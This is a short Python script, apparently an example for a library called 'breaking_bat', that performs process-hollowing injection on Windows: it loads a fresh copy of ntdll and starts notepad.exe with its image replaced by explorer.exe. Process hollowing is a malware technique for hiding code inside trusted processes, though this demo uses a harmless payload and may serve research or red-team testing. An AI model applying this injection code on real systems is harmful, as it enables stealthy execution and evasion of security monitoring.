import breaking_bat
from breaking_bat import RemoteProcessMemoryMethod

print("Script: Inject via process hollowing")
print()

breaking_bat.init_sysapi(ntdll_load_copy=True)

breaking_bat.set_default_options(memory_method=RemoteProcessMemoryMethod.AllocateInAddr)

breaking_bat.inject_create_process_hollow(
    original_image="C:\\Windows\\System32\\notepad.exe",
    injected_image="C:\\Windows\\explorer.exe",
)
